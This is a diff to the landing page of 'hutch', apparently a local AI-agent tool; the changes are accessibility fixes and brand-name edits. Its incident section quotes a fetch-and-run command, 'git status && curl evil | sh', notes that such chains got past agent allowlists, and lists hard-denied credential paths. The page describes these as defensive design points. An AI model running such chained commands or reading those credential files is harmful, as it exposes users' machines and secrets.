@@ -9,6 +9,7 @@
   <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+  <a class="skip-link" href="#main">Skip to content</a>
 
 <nav class="nav">
   <div class="wrap nav-inner">
@@ -32,8 +33,8 @@
         <svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
         GitHub
       </a>
-      <a class="btn primary" href="#quickstart">Install Now</a>
-      <button class="mobile-menu-btn" id="menu-btn" aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-drawer">
+      <a class="btn ghost" href="#quickstart">Install Now</a>
+      <button class="mobile-menu-btn" id="menu-btn" aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-drawer" aria-expanded="false">
         <svg class="ic" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" aria-hidden="true"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
       </button>
     </div>
@@ -48,6 +49,7 @@
   </div>
 </nav>
 
+<main id="main">
 <header class="hero">
   <div class="wrap hero-inner">
     <div class="kicker">
@@ -183,7 +185,7 @@
     <div class="section-label">Incident Receipts &middot; Traceability</div>
     <h2 class="section-heading">Agent products keep failing the exact same ways. We engineered against each one.</h2>
     <p class="section-description">
-      Every safety rule, scheduling invariant, and memory architecture in Hutch traces to a verified public incident
+      Every safety rule, scheduling invariant, and memory architecture in hutch traces to a verified public incident
       or top user complaint from 2026 agent deployments.
     </p>
 
@@ -198,7 +200,7 @@
           "A coding-agent user awoke to hundreds of dollars charged by an unmonitored recursive loop. Cloud vendors meter your money and inform you via invoice."
         </p>
         <div class="receipt-answer">
-          <b>Hutch's Invariant:</b> Hard step limits, wall-clock kill switches, and per-bot daily token caps enforced at the engine kernel, not the LLM's courtesy.
+          <b>hutch's invariant:</b> Hard step limits, wall-clock kill switches, and per-bot daily token caps enforced at the engine kernel, not the LLM's courtesy.
         </div>
       </div>
 
@@ -212,7 +214,7 @@
           "Laptop asleep, DST transition, or daemon crash: scheduled jobs silently vanish while dashboards display deceptive green. Users call it the expensive quiet catastrophe."
         </p>
         <div class="receipt-answer">
-          <b>Hutch's Invariant:</b> Sleep catch-up detects missed intervals and coalesces them into a verified run; IANA-safe cron math prevents double-fires.
+          <b>hutch's invariant:</b> Sleep catch-up detects missed intervals and coalesces them into a verified run; IANA-safe cron math prevents double-fires.
         </div>
       </div>
 
@@ -226,7 +228,7 @@
           "A major CLI agent deterministically uploaded the user's home folder to cloud storage. Another consumer assistant read personal messages and disclosed home addresses."
         </p>
         <div class="receipt-answer">
-          <b>Hutch's Invariant:</b> Isolated workspace path jail with redirected HOME. Critical secrets (<code>~/.ssh</code>, <code>.env</code>, <code>~/.aws</code>) are hard-denied before execution.
+          <b>hutch's invariant:</b> Isolated workspace path jail with redirected HOME. Critical secrets (<code>~/.ssh</code>, <code>.env</code>, <code>~/.aws</code>) are hard-denied before execution.
         </div>
       </div>
 
@@ -240,7 +242,7 @@
           "Agents nag until developers switch on <code>--dangerously-skip-permissions</code>. Chained commands like <code>git status &amp;&amp; curl evil | sh</code> bypassed allowlists for a year."
         </p>
         <div class="receipt-answer">
-          <b>Hutch's Invariant:</b> Sticky allows you grant once and can revoke anytime. Compound-command parser decomposes chains and enforces worst-verdict-wins.
+          <b>hutch's invariant:</b> Sticky allows you grant once and can revoke anytime. Compound-command parser decomposes chains and enforces worst-verdict-wins.
         </div>
       </div>
 
@@ -254,7 +256,7 @@
           "Open-source tools like OpenClaw shipped with zero out-of-the-box restrictions, allowing models to mutate disk unchecked and lose memory in messy markdown files."
         </p>
         <div class="receipt-answer">
-          <b>Hutch's Invariant:</b> Strict default least-privilege, structured SQLite memory you can inspect and purge, and zero ambient shell permissions.
+          <b>hutch's invariant:</b> Strict default least-privilege, structured SQLite memory you can inspect and purge, and zero ambient shell permissions.
         </div>
       </div>
     </div>
@@ -267,7 +269,7 @@
     <div class="section-label">Architecture &middot; Bento Grid</div>
     <h2 class="section-heading">Engineered for absolute local reliability</h2>
     <p class="section-description">
-      The agent prompt loop is simple. Hutch is the hardened operational plumbing around it:
+      The agent prompt loop is simple. hutch is the hardened operational plumbing around it:
       sandboxing, scheduling, approvals, budgets, and append-only audits.
     </p>
 
@@ -330,7 +332,7 @@
     <h2 class="section-heading">Cloud agents are impressive. They are also not yours.</h2>
     <p class="section-description">
       OpenAI Dots, Grok Team Bots, Meta Muse, and OpenClaw pushed personal agents mainstream in 2026.
-      Here is how Hutch stands apart on sovereignty, budgets, and safety.
+      Here is how hutch stands apart on sovereignty, budgets, and safety.
     </p>
 
     <div class="swipe-hint"><span>Swipe horizontally to compare all platforms</span></div>
@@ -339,7 +341,7 @@
         <thead>
           <tr>
             <th>Feature</th>
-            <th class="matrix-hutch">HUTCH</th>
+            <th class="matrix-hutch">hutch</th>
             <th>OPENAI DOTS</th>
             <th>GROK TEAM BOTS</th>
             <th>META MUSE</th>
@@ -502,35 +504,35 @@ hutch daemon</div>
       <div class="faq-box">
         <details>
           <summary>Do I need an API key, credit card, or GPU?</summary>
-          <p>No. Hutch includes a built-in deterministic mock runtime that runs the full tool and approval pipeline completely offline for free. When you want real intelligence, connect any local model (Ollama, llama.cpp on CPU or GPU) or any OpenAI-compatible endpoint with an API key.</p>
+          <p>No. hutch includes a built-in deterministic mock runtime that runs the full tool and approval pipeline completely offline for free. When you want real intelligence, connect any local model (Ollama, llama.cpp on CPU or GPU) or any OpenAI-compatible endpoint with an API key.</p>
         </details>
       </div>
 
       <div class="faq-box">
         <details>
-          <summary>Does Hutch phone home or send telemetry?</summary>
+          <summary>Does hutch phone home or send telemetry?</summary>
           <p>No. Zero telemetry, zero phone-home, zero accounts, and zero analytics. Everything lives inside <code>~/.local/state/hutch</code> on your disk in SQLite and JSONL files you can inspect, back up, or delete.</p>
         </details>
       </div>
 
       <div class="faq-box">
         <details>
-          <summary>How does Hutch differ from OpenClaw?</summary>
-          <p>OpenClaw provided a lightweight local agent but shipped with zero out-of-the-box guardrails, ambient shell authority, and flat markdown memory that suffered desync. Hutch provides isolated workspace path jails, sticky human-in-the-loop approvals, structured SQLite memory you can inspect, and hard token budget caps.</p>
+          <summary>How does hutch differ from OpenClaw?</summary>
+          <p>OpenClaw provided a lightweight local agent but shipped with zero out-of-the-box guardrails, ambient shell authority, and flat markdown memory that suffered desync. hutch provides isolated workspace path jails, sticky human-in-the-loop approvals, structured SQLite memory you can inspect, and hard token budget caps.</p>
         </details>
       </div>
 
       <div class="faq-box">
         <details>
           <summary>What happens if my laptop goes to sleep during a scheduled run?</summary>
-          <p>Hutch tracks schedule intervals in the bot's IANA timezone. When your machine wakes up, the scheduler detects missed windows and triggers a single catch-up run tagged with <code>+N missed windows</code>, preventing silent run loss and avoiding duplicate execution stampedes.</p>
+          <p>hutch tracks schedule intervals in the bot's IANA timezone. When your machine wakes up, the scheduler detects missed windows and triggers a single catch-up run tagged with <code>+N missed windows</code>, preventing silent run loss and avoiding duplicate execution stampedes.</p>
         </details>
       </div>
 
       <div class="faq-box">
         <details>
           <summary>What happens when a browser bot hits a CAPTCHA or MFA wall?</summary>
-          <p>Hutch emits a pause-to-human event and waits for you. Bots never hallucinate clicks on verification walls or try to solve CAPTCHAs. Because Chromium profiles persist per bot, logins survive between runs.</p>
+          <p>hutch emits a pause-to-human event and waits for you. Bots never hallucinate clicks on verification walls or try to solve CAPTCHAs. Because Chromium profiles persist per bot, logins survive between runs.</p>
         </details>
       </div>
     </div>
@@ -543,11 +545,12 @@ hutch daemon</div>
     <h2>Stop renting your agents.</h2>
     <p>Open source, local-first, and answerable to you &mdash; not a monthly subscription tier.</p>
     <div style="display:flex;gap:14px;justify-content:center;flex-wrap:wrap;">
-      <a class="btn primary" href="#quickstart">Install Hutch</a>
+      <a class="btn primary" href="#quickstart">Install hutch</a>
       <a class="btn ghost" href="https://github.com/K-Arthur/hutch" target="_blank" rel="noopener">Read the Source on GitHub</a>
     </div>
   </div>
 </section>
+</main>
 
 <footer class="site">
   <div class="wrap">
@@ -608,15 +611,22 @@ if (copyBtn) {
   });
 }
 
-// Mobile drawer toggle
+// Mobile drawer toggle (aria-expanded, Escape to close, focus returned)
 const menuBtn = document.getElementById('menu-btn');
 const drawer = document.getElementById('mobile-drawer');
 if (menuBtn && drawer) {
-  menuBtn.addEventListener('click', () => {
-    drawer.style.display = drawer.style.display === 'none' ? 'flex' : 'none';
-  });
-  drawer.querySelectorAll('a').forEach(a => {
-    a.addEventListener('click', () => { drawer.style.display = 'none'; });
+  const setDrawer = open => {
+    drawer.style.display = open ? 'flex' : 'none';
+    menuBtn.setAttribute('aria-expanded', String(open));
+    if (open) drawer.querySelector('a')?.focus();
+  };
+  menuBtn.addEventListener('click', () => setDrawer(drawer.style.display === 'none'));
+  drawer.querySelectorAll('a').forEach(a => a.addEventListener('click', () => setDrawer(false)));
+  document.addEventListener('keydown', ev => {
+    if (ev.key === 'Escape' && drawer.style.display !== 'none') {
+      setDrawer(false);
+      menuBtn.focus();
+    }
   });
 }
 </script>
